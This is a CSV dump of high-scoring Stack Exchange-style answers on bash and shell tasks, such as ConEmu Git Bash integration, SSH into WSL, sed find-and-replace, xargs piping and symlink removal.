Title,Id,Tags,Score,Body
"Git Bash Here in ConEmu","454380","<windows><bash><git><conemu>","123","<p>There are a number of ways this can be done in ConEmu as it is so highly configurable, but here's the way I do it.</p>

<ul>
<li>In ConEmu, hit <kbd>Win</kbd><kbd>Alt</kbd><kbd>p</kbd> to open the settings dialog.</li>
<li>Select the Tasks subsection under the Startup node and click the + icon to add a new 'Task'</li>
<li>In the Task Name field enter <code>Git Bash</code>, leave Task Parameters blank and add <code>""C:\Program Files\Git\bin\sh.exe"" --login -i</code> to the Commands section. It should look something like this:</li>
</ul>

<p><a href=""https://i.stack.imgur.com/u3QFq.png""><img src=""https://i.stack.imgur.com/u3QFq.png"" alt=""Git Bash task""></a></p>

<ul>
<li>Now select the Integration node and enter the following under the <strong>ConEmu Here - Explorer menu integration</strong> section: 

<ul>
<li>Menu item: <code>ConEmu Here [Git Bash]</code></li>
<li>Command: <code>/single /cmd {Git Bash}</code></li>
<li>Icon file: <code>C:\Program Files\Git\mingw64\share\git\git-for-windows.ico</code></li>
</ul></li>
<li>Click the Register button</li>
</ul>

<p><a href=""https://i.stack.imgur.com/LiPca.png""><img src=""https://i.stack.imgur.com/LiPca.png"" alt=""Integration""></a></p>

<p>This should add an entry in your right-click context menu (complete with icon). In the Command field you can use any of the <a href=""http://conemu.github.io/en/ConEmuArgs.html"">ConEmu.exe switches</a> (worth checking out for more complete documentation of what you can do - it's pretty powerful).</p>

<p><strong>Note:</strong> If you'd like a Git for Windows icon to appear at the top left of the ConEmu window, use the <code>/icon</code> switch; e.g.,</p>

<pre><code>/icon ""C:\Program Files\Git\mingw64\share\git\git-for-windows.ico"" /single /cmd {Git Bash}
</code></pre>

<p>This only seems to work if it's the first tab open, though.</p>
"
"How can I SSH into ""Bash on Ubuntu on Windows 10""?","1111591","<windows-10><bash><ssh><windows-10-v1607><windows-subsystem-for-linux>","122","<p>I got it to work; here's how.</p>

<p>Uninstalled ssh-server, reinstalled it and made sure it's started with</p>

<pre><code>sudo service ssh --full-restart
</code></pre>

<p>Make sure you turned off root access and added another user in the config file.</p>

<p>I was able to connect to the subsystem on 127.0.0.1:22 as expected. 
I hope this will help you.</p>

<p><img src=""https://i.stack.imgur.com/7hZjW.png"" alt=""Here&#39;s a screenshot.""></p>

<ol>
<li><code>sudo apt-get purge openssh-server</code></li>
<li><code>sudo apt-get install openssh-server</code></li>
<li><code>sudo nano /etc/ssh/sshd_config</code> and disallow root login by setting <code>PermitRootLogin no</code></li>
<li><p>Then add a line beneath it that says:</p>

<p><code>AllowUsers yourusername</code></p>

<p>and make sure <code>PasswordAuthentication</code> is set to <code>yes</code> if you want to login using a password.</p></li>
<li><p>Disable privilege separation by adding/modifying : <code>UsePrivilegeSeparation no</code></p></li>
<li><p><code>sudo service ssh --full-restart</code></p></li>
<li><p>Connect to your Linux subsystem from Windows using a ssh client like PuTTY.</p></li>
</ol>
"
"looping through `ls` results in bash shell script","31464","<bash><shell><shell-script>","121","<p><strong>Edited not to use ls where a glob would do, as @shawn-j-goff and others suggested.</strong></p>

<p>Just use a <code>for..do..done</code> loop:</p>

<pre><code>for f in *; do
  echo ""File -&gt; $f""
done
</code></pre>

<p>You can replace the <code>*</code> with <code>*.txt</code> or any other glob that returns a list (of files, directories, or anything for that matter), a command that generates a list, e.g., <code>$(cat filelist.txt)</code>, or actually replace it with a list.</p>

<p>Within the <code>do</code> loop, you just refer to the loop variable with the dollar sign prefix (so <code>$f</code> in the above example). You can <code>echo</code> it or do anything else to it you want.</p>

<p>For example, to rename all the <code>.xml</code> files in the current directory to <code>.txt</code>:</p>

<pre><code>for x in *.xml; do 
  t=$(echo $x | sed 's/\.xml$/.txt/'); 
  mv $x $t &amp;&amp; echo ""moved $x -&gt; $t""
done
</code></pre>

<p>Or even better, if you are using Bash you can use Bash parameter expansions rather than spawning a subshell:</p>

<pre><code>for x in *.xml; do 
  t=${x%.xml}.txt
  mv $x $t &amp;&amp; echo ""moved $x -&gt; $t""
done
</code></pre>
"
"Display each sub-directory size in a list format using one line command in Bash?","554319","<linux><bash><du>","121","<p>You probably want to see the directories ordered by size:</p>

<p><code>$ du -hs * | sort -hr</code></p>

<pre><code>856M    lib
746M    share
612M    lib64
312M    src
267M    java
239M    bin
179M    sbin
173M    local
93M     i686-w64-mingw32
72M     libexec
26M     include
20M     puppet
772K    X11R6
20K     man
4.0K    games
4.0K    etc
0       tmp
</code></pre>
"
"Windows Linux Subsystem - Accessing Files outside of Ubuntu","1083962","<windows-10><bash><windows-subsystem-for-linux>","119","<p>I'm not sure if I'm misunderstanding your question, but your ubuntu bash (top right window) should have access to your Windows-based disks under <code>/mnt</code>.  For example, on my machine <code>/mnt/c/Users/Scott/Desktop</code> is my Windows desktop and I can read/write files there from vi for ex.  I don't believe the opposite is true just yet.  That is, I don't think you can explore into your bash world from Windows explorer.</p>

<p>What I've been doing as a developer is to host projects on my d: and point the linux-based tools to that <code>/mnt/d/projects/someproject/</code> folder.</p>

<p>Make sure you update your Windows builds periodically as they seem to be fixing a lot of issues with each build, especially around sym-links and crossing FS boundaries between Linux/Windows.</p>
"
"How to remove/reset Windows Subsystem for Linux on Windows Insider Build 14316","1065569","<ubuntu><bash><windows-10-preview><windows-subsystem-for-linux>","118","<p><strong>The following answer only applies to WSL on Windows 10 1703 and 1607.</strong> WSL on Windows 10 1709+ can be installed from within the Windows Store UWP application.</p>

<p>If you want to remove and reset the Linux subsystem, open a command line prompt with elevated permissions and enter the following commands:</p>

<pre><code>lxrun /uninstall /full 

lxrun /install
</code></pre>

<p>Sources:</p>

<ol>
<li><p><a href=""https://www.slightfuture.com/technote/lxss-lxrun"" rel=""noreferrer"">https://www.slightfuture.com/technote/lxss-lxrun</a></p></li>
<li><p><a href=""http://www.hanselman.com/blog/InstallingFishShellOnUbuntuOnWindows10.aspx"" rel=""noreferrer"">Installing Fish Shell on Ubuntu on Windows 10</a></p></li>
<li><p><a href=""https://insights.ubuntu.com/2016/04/14/howto-ubuntu-on-windows-2/"" rel=""noreferrer"">HOWTO: Ubuntu on Windows | Ubuntu Insights</a></p></li>
</ol>
"
"How do I reload .inputrc?","241187","<bash><unix><readline><inputrc>","117","<p>By default, <code>C-x C-r</code> is bound to <code>re-read-init-file</code>.</p>

<p>See the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Miscellaneous-Commands"">Bash Reference Manual</a> for explanation.</p>
"
"What does export do in BASH?","153371","<bash><export><shell-script>","108","<p>From <code>man bash</code>:</p>

<blockquote>
  <p><strong>ENVIRONMENT</strong></p>
  
  <p>When a program is invoked it is given an array of strings called the
  environment.  This is a list of
  name-value pairs, of the form
  name=value.</p>
  
  <p>The shell provides several ways to manipulate the environment.  On
  invocation, the shell  scans  its own 
  environment and creates a parameter
  for each name found, automatically
  marking it for export to child
  processes.  Executed commands inherit
  the environment.  The <code>export</code>  and 
  <code>declare  -x</code>  commands allow 
  parameters  and functions to be added
  to and deleted from the environment. 
  If the value of a parameter in the
  environment is modified, the new value
  becomes part of the  environment, 
  replacing the old.  The environment
  inherited by any executed command
  consists of the shell's initial
  environment, whose values may be
  modified in the shell, less any pairs
  removed by the <code>unset</code>  command,  plus
  any additions via the export and
  <code>declare -x</code> commands.</p>
</blockquote>
"
"How to add a mp3 handler to sox?","421153","<ubuntu><bash><mp3><sox>","108","<p>Pipe?</p>

<pre><code>lame --decode music.mp3 - | play -
</code></pre>

<p>Won't leave any trace.</p>
"
"Change default text editor for crontab to vim","281617","<ubuntu><bash><text-editors>","106","<p>The <code>crontab -e</code> command will check the environment variables <code>$EDITOR</code> and <code>$VISUAL</code> for an override of the default text editor, so...</p>

<pre><code>export VISUAL=vim
</code></pre>

<p>or </p>

<pre><code>export EDITOR=vim
</code></pre>

<p>should do the trick.</p>
"
"How can I do a recursive find and replace from the command line?","428493","<bash><shell><zsh><find-and-replace>","106","<p>This command will do it (tested on both Mac OS X Lion and Kubuntu Linux).</p>

<pre><code># Recursively find and replace in files
find . -type f -name ""*.txt"" -print0 | xargs -0 sed -i '' -e 's/foo/bar/g'
</code></pre>

<p>Here's how it works:</p>

<ol>
<li><code>find . -type f -name '*.txt'</code> finds, in the current directory (<code>.</code>) and below, all regular files (<code>-type f</code>) whose names end in <code>.txt</code></li>
<li><code>|</code> passes the output of that command (a list of filenames) to the next command</li>
<li><code>xargs</code> gathers up those filenames and hands them one by one to <code>sed</code></li>
<li><code>sed -i '' -e 's/foo/bar/g'</code> means ""edit the file in place, without a backup, and make the following substitution (<code>s/foo/bar</code>) multiple times per line (<code>/g</code>)"" (see <code>man sed</code>)</li>
</ol>

<p>Note that the 'without a backup' part in line 4 is OK for me, because the files I'm changing are under version control anyway, so I can easily undo if there was a mistake.</p>

<p>To avoid having to remember this, I use an interactive bash script, as follows:</p>

<pre><code>#!/bin/bash
# find_and_replace.sh

echo ""Find and replace in current directory!""
echo ""File pattern to look for? (eg '*.txt')""
read filepattern
echo ""Existing string?""
read existing
echo ""Replacement string?""
read replacement
echo ""Replacing all occurences of $existing with $replacement in files matching $filepattern""

find . -type f -name $filepattern -print0 | xargs -0 sed -i '' -e ""s/$existing/$replacement/g""
</code></pre>
"
"How to remove a symbolic link to a directory?","9181","<linux><bash><symbolic-link>","105","<p>Remove the trailing slash:</p>

<p>With prompt:</p>

<blockquote>
  <p><code>$ rm test5</code></p>
</blockquote>

<p>Without prompt:</p>

<blockquote>
  <p><code>$ rm -f test5</code></p>
</blockquote>
"
"How to pipe command output to other commands?","189362","<bash><pipe>","101","<p>There is a distinction between command line arguments and standard input.  A pipe will connect standard output of one process to standard input of another.  So</p>

<pre><code>ls | echo
</code></pre>

<p>Connects standard output of ls to standard input of echo.  Fine right?  Well, echo ignores standard input and will dump its command line arguments - which are none in this case to - its own stdout. The output: nothing at all.</p>

<p>There are a few solutions in this case.  One is to use a command that reads stdin and dumps to stdout, such as cat.</p>

<pre><code>ls | cat
</code></pre>

<p>Will 'work', depending on what your definition of work is.  </p>

<p>But what about the general case. What you really want is to convert stdout of one command to command line args of another.  As others have said, <code>xargs</code> is the canonical helper tool in this case, reading its command line args for a command from its stdin, and constructing commands to run.</p>

<pre><code>ls | xargs echo
</code></pre>

<p>You could also convert this some, using the substitution command <code>$()</code></p>

<pre><code>echo $(ls)
</code></pre>

<p>Would also do what you want.</p>

<p>Both of these tools are pretty core to shell scripting, you should learn both.  </p>

<p>For completeness, as you indicate in the question, the other base way to convert stdin to command line args is the shell's builtin <code>read</code> command. It converts ""words"" (words as defined by the <code>IFS</code> variable) to a temp variable, which you can use in any command runs.</p>
"
